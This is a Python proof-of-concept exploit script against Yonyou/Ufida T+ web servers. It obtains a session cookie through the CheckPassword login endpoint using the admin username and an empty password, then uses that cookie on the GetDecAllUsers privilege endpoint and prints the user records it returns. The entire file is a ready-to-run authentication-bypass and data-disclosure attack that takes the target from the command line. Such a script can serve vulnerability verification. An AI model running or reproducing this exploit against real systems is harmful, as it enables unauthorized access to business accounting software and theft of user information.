#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import requests
import urllib3
import sys
import time
import json
import re
from datetime import datetime, timedelta

urllib3.disable_warnings()

def get_cookie(site):
    burp0_url = site + "/tplus/ajaxpro/Ufida.T.SM.Login.UIP.LoginManager,Ufida.T.SM.Login.UIP.ashx?method=CheckPassword"
    burp0_headers = {"User-Agent": "Opera/8.16.(X11; Linux i686; nn-NO) Presto/2.9.183 Version/12.00", "Accept-Encoding": "gzip, deflate", "Accept": "*/*", "Connection": "close", "Content-Type": "application/json"}
    burp0_json={"AccountNum": "000", "ali_csessionid": "", "ali_scene": "", "ali_sig": "", "ali_token": "", "aqdKey": "", "cardNo": "", "fromWhere": "browser", "Password": "", "rdpDate": "17", "rdpMonth": "5", "rdpYear": "2023", "role": "", "UserName": "admin", "webServiceProcessID": "admin"}
    r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)
    if r.status_code == 200 and "error" in r.text:
        return r.headers["Set-Cookie"]
    return ""



def verify(site):
    burp0_url = site + "/tplus/sm/privilege/ajaxpro/Ufida.T.SM.UIP.Privilege.PreviligeControl,Ufida.T.SM.UIP.ashx?method=GetDecAllUsers"
    burp0_headers = {"User-Agent": "Opera/8.16.(X11; Linux i686; nn-NO) Presto/2.9.183 Version/12.00", "Accept-Encoding": "gzip, deflate", "Accept": "*/*", "Connection": "close", "Content-Type": "application/json"}
    burp0_json={"accNum": "", "condition": "", "onlyBuying": "false"}
    cookie = get_cookie(site)
    print(cookie)
    if cookie == "":
        return ""
    burp0_headers["Cookie"] = cookie
    r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)
    if "UserId" in r.text:
        return r.text[:500]
    return ""

if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，获取部分用户信息为：", info)
    else:
        print("[-]漏洞不存在") 
